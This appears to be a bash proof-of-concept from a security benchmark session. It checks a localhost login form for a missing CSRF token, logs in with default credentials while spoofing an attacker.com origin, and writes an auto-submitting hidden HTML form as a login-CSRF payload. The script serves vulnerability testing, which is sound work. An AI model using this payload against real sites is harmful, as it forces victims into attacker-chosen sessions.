#!/bin/bash
# POC: Demonstrates CSRF vulnerability in login form by showing login form lacks CSRF tokens and application accepts login requests without token validation
# Target: ./repo
# Created: 2025-12-02T16:19:29.980Z
# Session: benchmark-XBEN-093-24-miorxjqr

# CSRF Attack POC - Login Form Missing CSRF Protection
# This script demonstrates that the login form is vulnerable to CSRF attacks
# because it lacks CSRF token validation

TARGET_URL="http://localhost:5003"
LOGIN_ENDPOINT="/login"

echo "=== CSRF Vulnerability POC - Login Form ==="
echo ""

# Test 1: Check if login form contains CSRF token
echo "[*] Test 1: Checking if login form contains CSRF token..."
FORM_RESPONSE=$(curl -s "$TARGET_URL$LOGIN_ENDPOINT")

if echo "$FORM_RESPONSE" | grep -qi "csrf\|_token\|authenticity"; then
    echo "[✓] Login form contains CSRF token field"
    echo "    Form appears to have CSRF protection"
    exit 0
else
    echo "[✗] Login form does NOT contain CSRF token"
    echo "    CSRF token missing from login form!"
fi

echo ""

# Test 2: Perform login without CSRF token (demonstrates acceptance)
echo "[*] Test 2: Attempting login with default credentials and NO CSRF token..."
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
    -d "username=user&password=user" \
    -w "\n%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$LOGIN_RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "[✗] VULNERABLE: Login accepted without CSRF token!"
    echo "    HTTP Status: $HTTP_CODE"
    echo "    Response indicates successful authentication"
else
    echo "[✓] Login rejected (status: $HTTP_CODE)"
    exit 0
fi

echo ""

# Test 3: Demonstrate cross-origin request acceptance
echo "[*] Test 3: Attempting login from different origin (simulated CSRF)..."
CSRF_RESPONSE=$(curl -s -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
    -d "username=user&password=user" \
    -H "Referer: http://attacker.com" \
    -H "Origin: http://attacker.com" \
    -w "\n%{http_code}")

CSRF_HTTP_CODE=$(echo "$CSRF_RESPONSE" | tail -n 1)

if [ "$CSRF_HTTP_CODE" = "302" ] || [ "$CSRF_HTTP_CODE" = "200" ]; then
    echo "[✗] VULNERABLE: Cross-origin login request accepted!"
    echo "    HTTP Status: $CSRF_HTTP_CODE"
    echo "    No origin/referer validation present"
else
    echo "[✓] Cross-origin request rejected"
fi

echo ""

# Test 4: Create a malicious HTML form (CSRF attack payload)
echo "[*] Test 4: Generating malicious CSRF attack HTML..."
cat > /tmp/csrf_attack.html << 'EOF'
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost:5003/login" method="POST" style="display:none">
      <input type="hidden" name="username" value="user">
      <input type="hidden" name="password" value="user">
    </form>
  </body>
</html>
EOF

echo "[✗] CSRF Attack Form Created: /tmp/csrf_attack.html"
echo "    This form would automatically log in a victim as the default user"
echo "    when loaded in a victim's browser with an active session"

echo ""
echo "=== CSRF Vulnerability Confirmed ==="
echo "The login form is vulnerable to CSRF attacks:"
echo "1. No CSRF token present in login form"
echo "2. Application accepts login without CSRF token"
echo "3. No origin/referer validation"
echo "4. Accepts requests from any origin"